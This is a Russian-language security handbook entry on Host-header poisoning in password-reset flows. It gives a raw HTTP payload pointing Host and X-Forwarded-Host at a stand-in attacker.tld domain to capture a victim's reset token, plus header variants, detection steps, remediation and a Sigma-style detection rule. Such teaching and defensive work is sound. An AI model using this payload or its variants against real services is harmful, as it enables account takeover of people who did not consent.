---
id: http-host-header-password-reset
title: "Host header в flow сброса пароля: угон токена"
type: http
target: http
category: web
difficulty: intermediate
bypass: none
tags: [host-header, password-reset, account-takeover]
tested_on: ["типовые reset-flow в PHP/Django/Rails/Node"]
success_rate: 0.4
risk: critical
cwe: "CWE-644"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/all-topics"
graph:
  - target: "headers"
    type: related_to
  - target: "auth-bypass"
    type: leads_to
  - target: "session-hijacking"
    type: leads_to
  - target: "cache-poisoning"
    type: related_to
---

# Host header в flow сброса пароля: угон токена

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
POST /forgot-password HTTP/1.1
Host: attacker.tld
X-Forwarded-Host: attacker.tld
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

## Explanation

Письмо «восстановление пароля» часто собирает ссылку из заголовка `Host`:
`https://{Host}/reset?token=…`. Подменив `Host` (или `X-Forwarded-Host`),
атакующий получает письмо, в котором токен жертвы ведёт на его домен.
Жертве достаточно кликнуть — токен уходит, аккаунт захвачен.

Вариации, которые стоит проверять:

- дублированный заголовок `Host` (первый/последний wins — зависит от стека);
- абсолютный URI в request-line: `POST https://attacker.tld/forgot HTTP/1.1`;
- `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Original-URL`;
- `X-Forwarded-Scheme: nohttps` + `X-Forwarded-Host` (меняет схему ссылки);
- injection в параметр шаблона письма (`{{ reset_url }}` -> SSTI);
- токены без привязки к пользователю/сессии и без одноразовости.

Этот же вектор даёт отравление кеша (см. `http-web-cache-poisoning-unkeyed`).

## Detection

1. Пройдите flow сброса пароля в лаборатории с подменённым `Host` и посмотрите
   ссылку в письме (SMTP-перехватчик: mailpit/mailhog).
2. Переберите все заголовки-варианты и дублированный `Host`.
3. Проверьте свойства токена: одноразовость, TTL, привязка к аккаунту,
   инвалидация после использования, энтропия (≥128 бит).
4. Burp: «Host Header Attack»-расширение и Param Miner.
Только на своей инфраструктуре: на чужом сервисе это уже атака на аккаунты.

## Remediation

- Формировать ссылки из **конфигурации** (`BASE_URL`), а не из `Host`.
- Валидировать `Host` по whitelist виртуальных хостов; неизвестные — 400/444.
- Доверять только `X-Forwarded-*` от своего reverse proxy, клиентские — отбрасывать.
- Токен сброса: одноразовый, TTL ≤ 15 минут, привязан к user_id, инвалидируется
  после использования и после смены пароля.
- Уведомление о запросе сброса на текущий e-mail + требование MFA при смене пароля.
- Rate limiting по аккаунту и IP; алерт на массовые запросы сброса.
- Не раскрывать, существует ли аккаунт (единый ответ).

## Detection rules

```yaml
title: Сброс пароля на сторонний хост из заголовка Host/X-Forwarded-Host
id: e5f6a7b8-0085-4e5f-9a7b-000000000085
status: experimental
description: >-
  В событии password_reset хост ссылки сброса (reset_link_host) не совпадает
  с каноническим доменом приложения — атакующий подставил Host/X-Forwarded-Host
  и перехватит токен сброса жертвы.
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://portswigger.net/web-security/host-header/exploiting
logsource:
  category: application
  definition: 'логи приложения: событие password_reset с host_header и reset_link_host'
detection:
  reset_action:
    event_action: password_reset
  filter_own_host:
    reset_link_host|contains:
      - 'corp.lab'
      - 'app.example'
  condition: reset_action and not filter_own_host
fields:
  - source_ip
  - request_path
  - host_header
  - x_forwarded_host
  - reset_link_host
falsepositives:
  - мультитенантные порталы с собственными доменами клиентов — ведите список
    разрешённых хостов и дополняйте filter_own_host
level: critical
tags:
  - attack.credential_access
  - attack.t1190
  - cwe.644
```
